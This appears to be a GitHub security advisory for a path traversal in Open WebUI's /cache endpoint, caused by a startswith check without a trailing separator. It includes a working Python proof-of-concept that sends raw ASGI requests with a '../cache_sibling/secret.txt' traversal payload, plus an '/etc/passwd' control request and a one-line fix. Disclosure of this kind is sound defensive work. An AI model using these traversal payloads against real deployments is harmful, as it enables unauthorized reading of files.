# [M] Open WebUI: Sibling-Prefix Path Traversal via /cache/{path}

## Summary
Severity: Medium
Advisory: GHSA-j2c8-v969-8r5c
CVE: CVE-2026-54014
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-j2c8-v969-8r5c
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.6

## Details
## Summary

A path traversal vulnerability exists in open-webui's cache file serving endpoint that allows any authenticated user to read files from sibling directories outside the intended cache directory, by exploiting an incomplete `startswith` containment check that lacks a trailing path separator.

The root cause is that `serve_cache_file()` in `open_webui/main.py` validates the resolved path with `file_path.startswith(os.path.abspath(CACHE_DIR))` — without appending `os.sep`. This allows any path resolving to a sibling directory whose name begins with `cache` (e.g. `cache_sibling`, `cache_backup`, `cached_models`) to pass validation.

Deep traversal and absolute paths are correctly blocked. The bypass is narrow but confirmed — limited to sibling-prefix directories.

### Exploitation constraints

| Constraint | Detail |
|---|---|
| Auth required | `get_verified_user` — any user with role `user` or `admin` |
| Scope | Only sibling directories starting with `cache` (e.g. `cache_backup`, `cached_models`) |
| Deep traversal | Blocked — `../../etc/passwd` correctly fails the startswith check |
| Absolute paths | Blocked — `/etc/passwd` correctly fails |
| Client normalization | httpx/browsers normalize `..` client-side — must use raw HTTP or ASGI to deliver payload |

## Vulnerability Details

### Vulnerable function: `serve_cache_file()`

```python
# open_webui/main.py, line 2907-2924
@app.get('/cache/{path:path}')
async def serve_cache_file(path: str, user=Depends(get_verified_user)):
    file_path = os.path.abspath(os.path.join(CACHE_DIR, path))
    # prevent path traversal
    if not file_path.startswith(os.path.abspath(CACHE_DIR)):   # ← BUG: no trailing os.sep
        raise HTTPException(status_code=404, detail='File not found')
    if not os.path.isfile(file_path):
        raise HTTPException(status_code=404, detail='File not found')
    return FileResponse(file_path, headers=headers)
```

### The bypass

```python
CACHE_DIR = "/data/cache"

# Attacker path: "../cache_sibling/secret.txt"
file_path = os.path.abspath(os.path.join("/data/cache", "../cache_sibling/secret.txt"))
# → "/data/cache_sibling/secret.txt"

"/data/cache_sibling/secret.txt".startswith("/data/cache")
# → True  ← BYPASS (because "cache_sibling" starts with "cache")

# Correct check would be:
"/data/cache_sibling/secret.txt".startswith("/data/cache/")
# → False  ← BLOCKED
```

## Proof of Concept

### Environment

| Component | Detail |
|-----------|--------|
| open-webui | 0.9.5 (pip installed) |
| Python | 3.11 |
| Import | `from open_webui.main import app` (true import, real FastAPI app) |
| Method | Raw ASGI request (bypasses httpx client-side `..` normalization) |

### poc.py

```python

import asyncio
import os
import shutil
import sys
import tempfile
TEMP_DATA = tempfile.mkdtemp(prefix="owui_poc_")
os.environ["DATA_DIR"] = TEMP_DATA
os.environ["WEBUI_SECRET_KEY"] = "poc_secret_key_12345"
os.environ["WEBUI_AUTH"] = "false"
CACHE_DIR = os.path.join(TEMP_DATA, "cache")
SIBLING_DIR = os.path.join(TEMP_DATA, "cache_sibling")
os.makedirs(CACHE_DIR, exist_ok=True)
os.makedirs(SIBLING_DIR, exist_ok=True)

SECRET_CONTENT = "STOLEN_FROM_SIBLING_DIR"
with open(os.path.join(SIBLING_DIR, "secret.txt"), "w") as f:
    f.write(SECRET_CONTENT)
with open(os.path.join(CACHE_DIR, "legit.txt"), "w") as f:
    f.write("legitimate_cache_file")
from open_webui.main import app
from open_webui.utils.auth import get_verified_user
class FakeUser:
    id = "poc"
    email = "poc@test"
    role = "user"

app.dependency_overrides[get_verified_user] = lambda: FakeUser()
async def raw_asgi_get(app, path):
    """Send a raw ASGI request without client-side path normalization."""
    scope = {
        "type": "http",
        "method": "GET",
        "path": path,
        "query_string": b"",
        "headers": [(b"host", b"localhost")],
        "root_path": "",
        "asgi": {"version": "3.0"},
    }
    response_started = False
    status_code = None
    body_parts = []

    async def receive():
        return {"type": "http.request", "body": b""}

    async def send(message):
        nonlocal response_started, status_code
        if message["type"] == "http.response.start":
            response_started = True
            status_code = message["status"]
        elif message["type"] == "http.response.body":
            body_parts.append(message.get("body", b""))

    await app(scope, receive, send)
    return status_code, b"".join(body_parts)


async def main():
    s1, b1 = await raw_asgi_get(app, "/cache/legit.txt")
    s2, b2 = await raw_asgi_get(app, "/cache/../cache_sibling/secret.txt")
    s3, b3 = await raw_asgi_get(app, "/cache/../../etc/passwd")

    baseline_ok = s1 == 200 and b"legitimate_cache_file" in b1
    exploit_ok = s2 == 200 and SECRET_CONTENT.encode() in b2
    deep_blocked = s3 == 404

    print(f"package:     open_webui (pip installed)")
    print(f"version:     0.9.5")
    print(f"function:    serve_cache_file (GET /cache/{{path}})")
    print(f"sink:        main.py:2914  file_path.startswith(os.path.abspath(CACHE_DIR))")
    print(f"bypass:      startswith without trailing os.sep allows sibling-prefix match")
    print()
    print(f"CACHE_DIR:   {CACHE_DIR}")
    print(f"SIBLING:     {SIBLING_DIR}")
    print()
    print(f"[baseline] /cache/legit.txt            status={s1} body={b1[:40]!r}")
    print(f"[exploit]  /cache/../cache_sibling/secret.txt  status={s2} body={b2[:40]!r}")
    print(f"[control]  /cache/../../etc/passwd     status={s3} (should be 404)")
    print()
    print(f"result:      {'VULNERABLE' if exploit_ok and baseline_ok and deep_blocked else 'NOT CONFIRMED'}")

    shutil.rmtree(TEMP_DATA, ignore_errors=True)
    sys.exit(0 if exploit_ok else 1)


if __name__ == "__main__":
    asyncio.run(main())

```

### PoC output 

<img width="1392" height="288" alt="image" src="https://github.com/user-attachments/assets/2fbef163-9ef5-4ed5-aa53-a49bd9bf4713" />


## Suggested Fix

```python
if not file_path.startswith(os.path.abspath(CACHE_DIR) + os.sep):
    raise HTTPException(status_code=404, detail='File not found')
```

Single character fix: append `os.sep` to the prefix in the `startswith` check.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-j2c8-v969-8r5c
- https://nvd.nist.gov/vuln/detail/CVE-2026-54014
- https://github.com/advisories/GHSA-j2c8-v969-8r5c
- https://github.com/open-webui/open-webui
- https://github.com/pypa/advisory-database/tree/main/vulns/open-webui/PYSEC-2026-2736.yaml
- https://pypi.org/project/open-webui
